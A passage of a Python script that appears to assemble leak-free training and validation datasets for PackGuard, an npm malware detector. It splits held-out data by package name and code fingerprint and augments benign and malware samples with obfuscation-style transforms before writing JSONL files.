            records.append({"package": rb["package"], "text": w, "label": 0, "tactic": 0, "source": "synth_hard_benign"})

        fm, cm = malware_templates[i % len(malware_templates)](i)
        km = "install_script" if fm == "install_scripts.txt" else "js"
        rm = {"package": f"synth7_mal_{i}", "chunks": [{"file": fm, "kind": km, "start": 0, "text": cm}]}
        wm, _ = build_package_windows_with_meta(rm, max_windows=3)
        for w in wm:
            tac = infer_tactic_id(1, w, "synth_hard_malware")
            records.append({"package": rm["package"], "text": w, "label": 1, "tactic": tac, "source": "synth_hard_malware"})

    return records


def _extract_pkg_record_task(args: Tuple[str, Path, int, str]) -> Optional[Dict[str, Any]]:
    cat, pdir, label, source = args
    rec = package_dir_to_record(pdir)
    if not rec.get("chunks"):
        return None
    wins, win_meta = build_package_windows_with_meta(rec, max_windows=12)
    if not wins:
        return None
    pj_name = extract_package_json_name(pdir)
    all_names = {normalize_package_name(pdir.name)}
    if pj_name:
        all_names.add(normalize_package_name(pj_name))
        all_names.add(pj_name.lower().strip())
    return {
        "package": pdir.name,
        "norm_name": normalize_package_name(pj_name or pdir.name),
        "all_names": sorted(all_names),
        "fingerprint": compute_code_fingerprint(rec),
        "category": cat,
        "label": label,
        "source": source,
        "windows": wins,
        "win_meta": win_meta,
        "chunks": rec["chunks"],
    }


def main() -> None:
    parser = argparse.ArgumentParser(description="Build leak-free Stage 2 v7 training, MIL, and dev_val datasets.")
    parser.add_argument("--repo-dir", default="/home/USER/PackGuard")
    parser.add_argument("--work-dir", default="/home/USER/v7_sandbox")
    parser.add_argument(
        "--reuse-raw-cache",
        default="/home/USER/v6_sandbox",
        help="Optional existing sandbox dir whose extracted `heldout/` and `train_raw/` folders can be reused.",
    )
    parser.add_argument("--benign-target", type=int, default=5200)
    parser.add_argument("--workers", type=int, default=min(32, os.cpu_count() or 8))
    parser.add_argument("--seed", type=int, default=42)
    args = parser.parse_args()

    rng = random.Random(args.seed)
    repo = Path(args.repo_dir).resolve()
    work = Path(args.work_dir).resolve()
    work.mkdir(parents=True, exist_ok=True)

    cache_root = Path(args.reuse_raw_cache).resolve() if args.reuse_raw_cache else None
    if cache_root and (cache_root / "heldout/benign").is_dir() and (cache_root / "train_raw").is_dir():
        print(f"[Step 1] Reusing already-extracted raw archives from {cache_root} (re-running full v7 AST/windowing)...")
        heldout_root = cache_root / "heldout"
        train_raw_root = cache_root / "train_raw"
    else:
        heldout_root = work / "heldout"
        train_raw_root = work / "train_raw"
        print("[Step 1] Extracting encrypted archives inside Linux sandbox...")
        extract_zip_folder(repo / "data/from-instance/benign", heldout_root / "benign")
        extract_zip_folder(repo / "data/from-instance/known", heldout_root / "known")
        extract_zip_folder(repo / "data/from-instance/new", heldout_root / "new")
        extract_zip_folder(repo / "data/from-instance/combined", train_raw_root / "combined")
        extract_zip_folder(repo / "data/v2", train_raw_root / "v2")
        extract_zip_folder(repo / "data/v1", train_raw_root / "v1")

    print("[Step 2] Indexing ALL 22,684 held-out sandbox packages for strict zero-leakage guard...")
    heldout_ben_dirs = discover_package_dirs(heldout_root / "benign", "flat")
    heldout_known_dirs = discover_package_dirs(heldout_root / "known", "flat")
    heldout_new_dirs = discover_package_dirs(heldout_root / "new", "flat")
    print(f"  Held-out counts: benign={len(heldout_ben_dirs)}, known={len(heldout_known_dirs)}, new={len(heldout_new_dirs)}")

    forbidden_names: Set[str] = set()
    forbidden_fps: Set[str] = set()
    for _, pdir in heldout_ben_dirs + heldout_known_dirs + heldout_new_dirs:
        forbidden_names.add(normalize_package_name(pdir.name))

    # Block base-package lineage leakage from `test-sets/manifest_real.json` & `manifest_invented.json` (`base` field!)
    for mf_name in ("manifest_real.json", "manifest_invented.json"):
        mf_path = repo / "test-sets" / mf_name
        if mf_path.is_file():
            try:
                mf_data = json.loads(mf_path.read_text(encoding="utf-8"))
                mf_entries = mf_data if isinstance(mf_data, list) else mf_data.get("packages", mf_data.get("entries", []))
                for entry in mf_entries:
                    if isinstance(entry, dict):
                        for key in ("package", "base"):
                            raw_v = entry.get(key)
                            if isinstance(raw_v, str) and raw_v.strip():
                                forbidden_names.add(normalize_package_name(raw_v))
            except Exception:
                pass

    fp_tasks = [(c, p, 0, "heldout") for c, p in heldout_ben_dirs + heldout_known_dirs + heldout_new_dirs]
    with concurrent.futures.ProcessPoolExecutor(max_workers=args.workers) as ex:
        for res in ex.map(_extract_pkg_record_task, fp_tasks, chunksize=32):
            if res is not None:
                for nm in res["all_names"]:
                    forbidden_names.add(nm)
                forbidden_fps.add(res["fingerprint"])

    print(f"  Leakage guard armed: {len(forbidden_names)} forbidden names, {len(forbidden_fps)} forbidden code fingerprints.")

    benign_dirs = harvest_fresh_benign_npm(
        out_dir=train_raw_root / "fresh_benign_npm",
        forbidden_names=forbidden_names,
        target_count=args.benign_target,
        workers=32,
    )

    print("[Step 4] Building v7 AST-deobfuscated records for leak-free benign & malware packages...")
    mal_candidates = (
        discover_package_dirs(train_raw_root / "combined", "flat")
        + discover_package_dirs(train_raw_root / "v2", "nested")
        + discover_package_dirs(train_raw_root / "v1", "nested")
    )

    ben_pkgs: List[Dict[str, Any]] = []
    mal_pkgs: List[Dict[str, Any]] = []
    seen_names: Set[str] = set()
    seen_fps: Set[str] = set()

    with concurrent.futures.ProcessPoolExecutor(max_workers=args.workers) as ex:
        for res in ex.map(_extract_pkg_record_task, [("npm_benign", p, 0, "real_npm_benign") for p in benign_dirs], chunksize=16):
            if res is None:
                continue
            if any(nm in forbidden_names for nm in res["all_names"]) or res["fingerprint"] in forbidden_fps:
                continue
            if any(nm in seen_names for nm in res["all_names"]) or res["fingerprint"] in seen_fps:
                continue
            seen_names.update(res["all_names"])
            seen_fps.add(res["fingerprint"])
            ben_pkgs.append(res)

        for res in ex.map(_extract_pkg_record_task, [(c, p, 1, "real_datadog_malware") for c, p in mal_candidates], chunksize=32):
            if res is None:
                continue
            if any(nm in forbidden_names for nm in res["all_names"]) or res["fingerprint"] in forbidden_fps:
                continue
            if any(nm in seen_names for nm in res["all_names"]) or res["fingerprint"] in seen_fps:
                continue
            seen_names.update(res["all_names"])
            seen_fps.add(res["fingerprint"])
            mal_pkgs.append(res)

    print(f"  Leak-free unique real packages ready: benign={len(ben_pkgs)}, malware={len(mal_pkgs)}")
    if len(ben_pkgs) < 1000 or len(mal_pkgs) < 1000:
        raise RuntimeError(f"Insufficient leak-free real packages: benign={len(ben_pkgs)}, malware={len(mal_pkgs)}")

    rng.shuffle(ben_pkgs)
    rng.shuffle(mal_pkgs)
    n_ben_val = max(450, int(len(ben_pkgs) * 0.12))
    n_mal_val = max(450, int(len(mal_pkgs) * 0.12))

    dev_val_pkgs = ben_pkgs[:n_ben_val] + mal_pkgs[:n_mal_val]
    train_ben_pkgs = ben_pkgs[n_ben_val:]
    train_mal_pkgs = mal_pkgs[n_mal_val:]

    # Hard zero-leakage assertions across Train, Dev-Val, and Held-Out
    train_names = {nm for p in train_ben_pkgs + train_mal_pkgs for nm in p["all_names"]}
    val_names = {nm for p in dev_val_pkgs for nm in p["all_names"]}
    train_fps = {p["fingerprint"] for p in train_ben_pkgs + train_mal_pkgs}
    val_fps = {p["fingerprint"] for p in dev_val_pkgs}
    assert len(train_names & val_names) == 0, "Name leakage between train and dev_val!"
    assert len(train_fps & val_fps) == 0, "Fingerprint leakage between train and dev_val!"
    assert len(train_names & forbidden_names) == 0, "Name leakage between train and heldout!"
    assert len(train_fps & forbidden_fps) == 0, "Fingerprint leakage between train and heldout!"
    assert len(val_names & forbidden_names) == 0, "Name leakage between dev_val and heldout!"
    assert len(val_fps & forbidden_fps) == 0, "Fingerprint leakage between dev_val and heldout!"

    terser_bin = shutil.which("terser")
    obf_bin = shutil.which("javascript-obfuscator")
    print(f"[Step 5] Building symmetric T1/T2 + obfuscated train windows & MIL bags (terser={bool(terser_bin)}, jsobf={bool(obf_bin)})...")

    train_ben_windows: List[Dict[str, Any]] = []
    train_mal_windows: List[Dict[str, Any]] = []
    train_mil_bags: List[Dict[str, Any]] = []

    for pkg in train_ben_pkgs:
        train_mil_bags.append(
            {
                "package": pkg["package"],
                "label": 0,
                "source": pkg["source"],
                "windows": pkg["windows"][:12],
                "win_meta": pkg["win_meta"][:12],
            }
        )
        for w in pkg["windows"][:7]:
            train_ben_windows.append({"package": pkg["package"], "text": w, "label": 0, "tactic": 0, "source": "real_benign"})

    for pkg in train_mal_pkgs:
        train_mil_bags.append(
            {
                "package": pkg["package"],
                "label": 1,
                "source": pkg["source"],
                "windows": pkg["windows"][:12],
                "win_meta": pkg["win_meta"][:12],
            }
        )
        wins = pkg["windows"]
        if len(wins) <= 2:
            chosen = wins
        else:
            ranked = sorted(wins, key=score_window_security_density, reverse=True)
            chosen = [w for w in ranked[:2] if score_window_security_density(w) > 0] or ranked[:1]
        for w in chosen:
            tac = infer_tactic_id(1, w, pkg["category"])
            train_mal_windows.append({"package": pkg["package"], "text": w, "label": 1, "tactic": tac, "source": "real_malware"})

    # Symmetric benign transforms (T1 reformat, T2 identifier rename, split strings, terser, data-only b64)
    ben_modes = ["t1_reformat", "t2_rename", "split_str", "data_b64"] + (["terser"] if terser_bin else [])
    for idx, pkg in enumerate(rng.sample(train_ben_pkgs, min(len(train_ben_pkgs), 2600))):
        js_chunks = [c for c in pkg["chunks"] if c.get("kind") == "js" and len(c.get("text", "")) >= 80]
        if not js_chunks:
            continue
        src = js_chunks[0]["text"]
        mode = ben_modes[idx % len(ben_modes)]
        if mode == "t1_reformat":
            t_code = transform_t1_reformat(src, rng)
        elif mode == "t2_rename":
            t_code = transform_t2_rename_identifiers(src, rng)
        elif mode == "split_str":
            t_code = transform_split_strings(src, rng)
        elif mode == "terser":
            t_code = _transform_terser(src, terser_bin) or ""
        else:
            meta_json = json.dumps({"ok": True, "tokens": re.findall(r"[A-Za-z_]{3,16}", src[:300])[:10]})
            b64 = base64.b64encode(meta_json.encode()).decode()
            t_code = f"const DATA_B64 = '{b64}';\nexports.readMeta = () => JSON.parse(Buffer.from(DATA_B64, 'base64').toString('utf8'));\n" + src[:1500]
        if not t_code:
            continue
        aug_rec = {"package": f"{pkg['package']}_b_{mode}", "chunks": [{"file": js_chunks[0]["file"], "kind": "js", "start": 0, "text": t_code}]}
        wins, wmeta = build_package_windows_with_meta(aug_rec, max_windows=2)
        if wins:
            train_mil_bags.append({"package": aug_rec["package"], "label": 0, "source": f"ben_{mode}", "windows": wins, "win_meta": wmeta})
        for w in wins:
            train_ben_windows.append({"package": aug_rec["package"], "text": w, "label": 0, "tactic": 0, "source": f"ben_{mode}"})

    # Comprehensive malware transforms (T1, T2, all 8 encoded/split/XOR/URI/hex loaders, terser, js-obfuscator)
    mal_modes = ["t1_reformat", "t2_rename", "enc_v0", "enc_v1", "enc_v2", "enc_v3", "enc_v4", "enc_v5", "enc_v6", "enc_v7", "split_str"]
    if terser_bin:
        mal_modes.append("terser")
    if obf_bin:
        mal_modes.append("jsobf")
    jsobf_count = 0
    for idx, pkg in enumerate(rng.sample(train_mal_pkgs, min(len(train_mal_pkgs), 4200))):
        js_chunks = [c for c in pkg["chunks"] if c.get("kind") == "js" and len(c.get("text", "")) >= 50]
        if not js_chunks:
            continue
        # Pick the most security-active JS file in the malware package to transform!
        best_chunk = max(js_chunks, key=lambda c: score_window_security_density(c.get("text", "")))
        src = best_chunk["text"]
        mode = mal_modes[idx % len(mal_modes)]
        if mode == "jsobf" and jsobf_count >= 500:
            mode = f"enc_v{idx % 8}"
        if mode == "t1_reformat":
            t_code = transform_t1_reformat(src, rng)
        elif mode == "t2_rename":
            t_code = transform_t2_rename_identifiers(src, rng)
        elif mode.startswith("enc_v"):
            v_num = int(mode.split("v")[1])
            t_code = transform_encoded_loader_variants(src, v_num, rng)
        elif mode == "split_str":
            t_code = transform_split_strings(src, rng)
        elif mode == "terser":
            t_code = _transform_terser(src, terser_bin) or ""
        else:
            t_code = _transform_js_obfuscator(src, obf_bin) or ""
            if t_code:
                jsobf_count += 1
        if not t_code:
            continue
        aug_rec = {"package": f"{pkg['package']}_m_{mode}", "chunks": [{"file": "index.js", "kind": "js", "start": 0, "text": t_code}]}
        wins, wmeta = build_package_windows_with_meta(aug_rec, max_windows=2)
        if wins:
            train_mil_bags.append({"package": aug_rec["package"], "label": 1, "source": f"mal_{mode}", "windows": wins, "win_meta": wmeta})
        for w in wins:
            tac = infer_tactic_id(1, w, f"mal_{mode}")
            train_mal_windows.append({"package": aug_rec["package"], "text": w, "label": 1, "tactic": tac, "source": f"mal_{mode}"})

    paired = generate_paired_boundary_samples_v7(rng, count_per_class=2200)
    for rec in paired:
        if rec["label"] == 0:
            train_ben_windows.append(rec)
        else:
            train_mal_windows.append(rec)

    # Add symmetric obfuscated/renamed dev_val slices (strictly derived ONLY from dev_val_pkgs)
    dev_val_extra: List[Dict[str, Any]] = []
    for idx, pkg in enumerate(dev_val_pkgs):
        if idx % 3 != 0:
            continue
        js_chunks = [c for c in pkg["chunks"] if c.get("kind") == "js" and len(c.get("text", "")) >= 60]
        if not js_chunks:
            continue
        best_c = max(js_chunks, key=lambda c: score_window_security_density(c.get("text", "")))
        src = best_c["text"]
        if pkg["label"] == 0:
            t_code = transform_t2_rename_identifiers(src, rng) if (idx // 3) % 2 == 0 else transform_t1_reformat(src, rng)
            src_tag = "dev_val_benign_t1t2"
        else:
            sub = (idx // 3) % 6
            if sub == 0:
                t_code = transform_t2_rename_identifiers(src, rng)
            elif sub == 1:
                t_code = transform_t1_reformat(src, rng)
            else:
                t_code = transform_encoded_loader_variants(src, sub, rng)
            src_tag = "dev_val_malware_obf_t1t2"
        wins, wmeta = build_package_windows_with_meta(
            {"package": f"{pkg['package']}_devaug", "chunks": [{"file": "index.js", "kind": "js", "start": 0, "text": t_code}]},
            max_windows=4,
        )
        if wins:
            dev_val_extra.append(
                {
                    "package": f"{pkg['package']}_devaug",
                    "norm_name": pkg["norm_name"],
                    "label": pkg["label"],
                    "source": src_tag,
                    "windows": wins,
                    "win_meta": wmeta,
                }
            )

    dev_val_pkgs.extend(dev_val_extra)
    rng.shuffle(dev_val_pkgs)
    rng.shuffle(train_mil_bags)

    # Balance classes strictly 50/50
    rng.shuffle(train_ben_windows)
    rng.shuffle(train_mal_windows)
    target_per_class = min(34000, max(len(train_ben_windows), len(train_mal_windows)))
    target_per_class = min(target_per_class, int(min(len(train_ben_windows), len(train_mal_windows)) * 1.5))

    def _sample_to_n(items: List[Dict[str, Any]], n: int) -> List[Dict[str, Any]]:
        if len(items) >= n:
            return items[:n]
        out = list(items)
        while len(out) < n:
            out.append(rng.choice(items))
        return out

    final_train = _sample_to_n(train_ben_windows, target_per_class) + _sample_to_n(train_mal_windows, target_per_class)
    rng.shuffle(final_train)

    ds_dir = work / "dataset"
    ds_dir.mkdir(parents=True, exist_ok=True)

    with (ds_dir / "train_windows.jsonl").open("w", encoding="utf-8") as fh:
        for rec in final_train:
            fh.write(json.dumps(rec, ensure_ascii=False) + "\n")

    with (ds_dir / "train_packages_mil.jsonl").open("w", encoding="utf-8") as fh:
        for bag in train_mil_bags:
            fh.write(json.dumps(bag, ensure_ascii=False) + "\n")

    with (ds_dir / "dev_val_packages.jsonl").open("w", encoding="utf-8") as fh:
        for pkg in dev_val_pkgs:
            fh.write(
                json.dumps(
                    {
                        "package": pkg["package"],
                        "norm_name": pkg["norm_name"],
                        "label": pkg["label"],
                        "source": pkg["source"],
                        "windows": pkg["windows"],
                        "win_meta": pkg.get("win_meta", []),
                    },
                    ensure_ascii=False,
                )
                + "\n"
            )

    pos_count = sum(1 for r in final_train if r["label"] == 1)
    manifest = {
        "version": "v7",
        "created_utc": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "leakage_verified_zero_overlap": True,
        "heldout_counts": {
            "benign": len(heldout_ben_dirs),
            "known": len(heldout_known_dirs),
            "new": len(heldout_new_dirs),
        },
        "train_real_packages": {"benign": len(train_ben_pkgs), "malware": len(train_mal_pkgs)},
        "train_mil_bags": len(train_mil_bags),
        "dev_val_total_packages": len(dev_val_pkgs),
        "train_windows_total": len(final_train),
        "train_positive_ratio": round(pos_count / max(1, len(final_train)), 4),
    }
    (ds_dir / "dataset_manifest.json").write_text(json.dumps(manifest, indent=2), encoding="utf-8")
    print("[Step 6] PackGuard Stage 2 v7 dataset build complete:")
    print(json.dumps(manifest, indent=2))


if __name__ == "__main__":
    main()
